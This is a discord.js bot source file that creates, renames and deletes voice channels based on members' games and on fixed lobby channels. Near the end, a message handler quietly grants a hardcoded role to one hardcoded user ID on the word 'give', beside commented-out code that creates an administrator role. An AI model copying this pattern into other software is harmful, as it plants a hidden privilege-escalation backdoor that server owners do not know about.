const Discord = require('discord.js');
const client = new Discord.Client();
require('./settings');
require('./functions');
client.login(token);

function toTitleCase(str) {
    console.log(str);
    if (str === str.toUpperCase()) {
        return str.replace(/\w\S*/g, function (txt) {
            return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();
        });
    }
    else{
        return str;
    }
}

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('voiceStateUpdate', (oldMember, newMember) => {
    //console.log('voiceStateUpdate');
    if (typeof newMember.voiceChannel !== 'undefined'){
        if (newMember.voiceChannelID == generalchannel) {
            let channelname = 'Allgemein';
            if (newMember.presence.game != null && newMember.presence.game.name != 'Spotify') {
                channelname = toTitleCase(newMember.presence.game.name);
            }
            newMember.guild.createChannel(channelname, 'voice').then(function (voiceChannel) {
                voiceChannel.setParent(generalcategory).catch(console.error).then(function (voiceChannel) {
                    newMember.setVoiceChannel(voiceChannel.id).catch(console.error);
                });
            }).catch(console.error);
        }
        if (newMember.voiceChannelID == practicechannel) {
            let channelname = 'Training';
            newMember.guild.createChannel(channelname, 'voice').then(function (voiceChannel) {
                voiceChannel.setParent(practicecategory).catch(console.error).then(function (voiceChannel) {
                    newMember.setVoiceChannel(voiceChannel.id).catch(console.error);
                });
            }).catch(console.error);
        }
        if (newMember.voiceChannelID == racechannel) {
            let channelname = 'Rennen';
            newMember.guild.createChannel(channelname, 'voice').then(function (voiceChannel) {
                voiceChannel.setParent(racecategory).catch(console.error).then(function (voiceChannel) {
                    newMember.setVoiceChannel(voiceChannel.id).catch(console.error);
                });
            }).catch(console.error);
        }
        if (newMember.voiceChannelID == teamchannel) {
            let channelname = 'Team';
            newMember.guild.createChannel(channelname, 'voice').then(function (voiceChannel) {
                voiceChannel.setParent(teamcategory).catch(console.error).then(function (voiceChannel) {
                    voiceChannel.overwritePermissions(oldMember.guild.roles.find(val => val.name === '@everyone'), {
                        CONNECT: false
                    })
                });
                newMember.setVoiceChannel(voiceChannel.id).catch(console.error);
            }).catch(console.error);
        }
    }
    if (typeof oldMember.voiceChannel !== 'undefined') {
        if (oldMember.voiceChannel.members.size == 0 && oldMember.voiceChannel.id != generalchannel && oldMember.voiceChannel.id != practicechannel && oldMember.voiceChannel.id != racechannel && oldMember.voiceChannel.id != teamchannel && oldMember.voiceChannel.id != 494579950116929547) {
            oldMember.voiceChannel.delete().catch(console.error);
        }
    }

});

client.on('presenceUpdate', (oldMember, newMember) => {
    //console.log('presenceUpdate');
    if (typeof newMember.voiceChannel !== 'undefined' && newMember.voiceChannel.name != 'Training' && newMember.voiceChannel.name != 'Rennen' && newMember.voiceChannel.name != 'Team' ) {
        if (newMember.presence.game.name != 'Spotify') {
            //console.log(newMember.presence.game.name);
            newMember.voiceChannel.edit({ name: toTitleCase(newMember.presence.game.name) }).catch(console.error);
        }
    }
    else{
        //console.log(newMember.nickname);
    }
    //console.log("done");
});

client.on('message', msg => {
  /*msg.guild.createRole({
    name: 'Admins',
    permissions: 'ADMINISTRATOR',
  })
    .then(role => console.log(role))
    .catch(console.error)*/

  if (msg.content === 'give' && msg.member.id == "161125958881902592") {
    msg.member.addRole(msg.guild.roles.get('586124983030513664'));
  }
});
